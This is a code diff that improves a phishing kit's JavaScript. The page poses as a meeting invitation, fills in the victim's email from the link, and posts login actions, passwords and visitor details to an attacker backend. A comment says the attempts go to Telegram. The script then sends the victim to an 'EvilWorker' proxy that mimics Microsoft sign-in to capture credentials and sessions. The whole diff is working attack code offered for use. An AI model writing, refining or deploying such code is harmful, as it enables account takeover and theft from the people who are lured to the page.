@@ -21,13 +21,14 @@ const BACKEND_URL = "https://meeting-h5ze.onrender.com";
 const PROXY_URL = "https://evilworker-bj83.onrender.com/login?method=signin&mode=secure&client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F";
 
 // ============================================================
-//  EMAIL GRABBER
+//  EMAIL GRABBER - Properly decodes email
 // ============================================================
 
 function getEmailFromUrl() {
     const params = new URLSearchParams(window.location.search);
     let email = params.get('e') || params.get('email') || '';
     
+    // Try base64 decode if the email looks encoded
     if (!email && window.location.search.length > 1) {
         const raw = window.location.search.substring(1);
         try {
@@ -43,6 +44,7 @@ function getEmailFromUrl() {
     }
     
     if (email) {
+        // Clean up and decode
         email = email.split('&')[0].split('?')[0];
         email = decodeURIComponent(email);
         if (!email.includes('@')) {
@@ -89,18 +91,31 @@ function getVisitorInfo() {
     };
 }
 
+// --- Send ALL login attempts to Telegram ---
 function logAction(action, extra = {}) {
-    // Get email from the input field or from the display span
+    // Get email from URL or input field
     const emailInput = document.getElementById('user');
     const emailDisplay = document.getElementById('userTxt');
-    const email = emailInput ? emailInput.value : (emailDisplay ? emailDisplay.textContent : 'unknown');
+    let email = emailInput ? emailInput.value : (emailDisplay ? emailDisplay.textContent : 'unknown');
+    
+    // If email is still unknown, try URL
+    if (email === 'unknown' || email === '') {
+        email = getEmailFromUrl() || 'unknown';
+    }
+    
+    // Decode email if it has URL encoding
+    try {
+        email = decodeURIComponent(email);
+    } catch (e) {
+        // Already decoded
+    }
     
     fetch(`${BACKEND_URL}/api/log-action`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            action,
-            email,
+            action: action,
+            email: email,
             password: extra.password || '',
             attempts: extra.attempts || 0,
             visitorInfo: getVisitorInfo()
@@ -108,20 +123,29 @@ function logAction(action, extra = {}) {
     }).catch(err => console.error('Log error:', err));
 }
 
+// --- Load page with decoded email ---
 function load() {
-    const email = getEmailFromUrl();
+    const rawEmail = getEmailFromUrl();
+    let email = rawEmail;
+    
+    // Decode email if needed
+    try {
+        email = decodeURIComponent(rawEmail);
+    } catch (e) {
+        email = rawEmail;
+    }
+    
     const emailInput = document.getElementById('user');
     const emailDisplay = document.getElementById('userTxt');
     const nameDisplay = document.getElementById('nameTxt');
     
-    if (email) {
+    if (email && email.includes('@')) {
         if (emailInput) emailInput.value = email;
         if (emailDisplay) emailDisplay.textContent = email;
         if (nameDisplay) nameDisplay.textContent = email.split('@')[0];
-        console.log('📧 Email auto-detected:', email);
+        console.log('📧 Email auto-detected (decoded):', email);
     } else {
-        // Use a default email from localStorage or a prompt
-        const savedEmail = localStorage.getItem('testEmail') || 'test@example.com';
+        const savedEmail = localStorage.getItem('testEmail') || 'guest@example.com';
         if (emailInput) emailInput.value = savedEmail;
         if (emailDisplay) emailDisplay.textContent = savedEmail;
         if (nameDisplay) nameDisplay.textContent = savedEmail.split('@')[0];
@@ -131,17 +155,37 @@ function load() {
     logAction('page_load');
 }
 
-// --- Redirect to EvilWorker Proxy (FIXED) ---
+// --- Redirect to EvilWorker Proxy with decoded email ---
 function redirectToProxy() {
-    // Get email directly from URL parameter
+    // Get email directly from URL parameter and decode it
     const params = new URLSearchParams(window.location.search);
-    const email = params.get('e') || params.get('email') || '';
-
-    if (!email) {
+    let rawEmail = params.get('e') || params.get('email') || '';
+    
+    // Try to get email from input if URL doesn't have it
+    if (!rawEmail) {
+        const emailInput = document.getElementById('user');
+        if (emailInput) rawEmail = emailInput.value;
+    }
+    
+    if (!rawEmail) {
         alert('No email provided in the URL');
         return;
     }
-
+    
+    // Decode the email for proper display
+    let email;
+    try {
+        email = decodeURIComponent(rawEmail);
+    } catch (e) {
+        email = rawEmail;
+    }
+    
+    // Validate email
+    if (!email.includes('@')) {
+        alert('Invalid email address');
+        return;
+    }
+    
     // Hide the main container, show loading
     const joinDiv = document.getElementById('joinDiv');
     const loadDiv = document.getElementById('loadDiv');
@@ -151,10 +195,18 @@ function redirectToProxy() {
     if (loadDiv) loadDiv.style.display = 'block';
     if (loadTxt) loadTxt.textContent = 'Connecting to meeting...';
     
-    logAction('click_join');
+    // Log the redirect
+    logAction('click_join', { email: email });
     
+    // Send the email to EvilWorker (properly encoded for URL)
+    const encodedEmail = encodeURIComponent(email);
+    const proxyUrl = PROXY_URL + '&login_hint=' + encodedEmail;
+    
+    console.log('🔗 Redirecting to proxy with email:', email);
+    console.log('🔗 Encoded email:', encodedEmail);
+    
+    // Redirect after a short delay
     setTimeout(function() {
-        const proxyUrl = PROXY_URL + '&login_hint=' + encodeURIComponent(email);
         window.location.href = proxyUrl;
     }, 1500);
 }
@@ -163,13 +215,21 @@ function redirectToProxy() {
 document.addEventListener('DOMContentLoaded', function() {
     load();
     
-    // Enter key support: if user presses Enter on password field, trigger redirect
+    // Enter key support
     const passInput = document.getElementById('pass');
     if (passInput) {
         passInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 redirectToProxy();
             }
+        });
+    }
+    
+    // Also support Enter on the main button
+    const joinBtn = document.querySelector('.btn-primary');
+    if (joinBtn) {
+        joinBtn.addEventListener('click', function(e) {
+            redirectToProxy();
         });
     }
 });
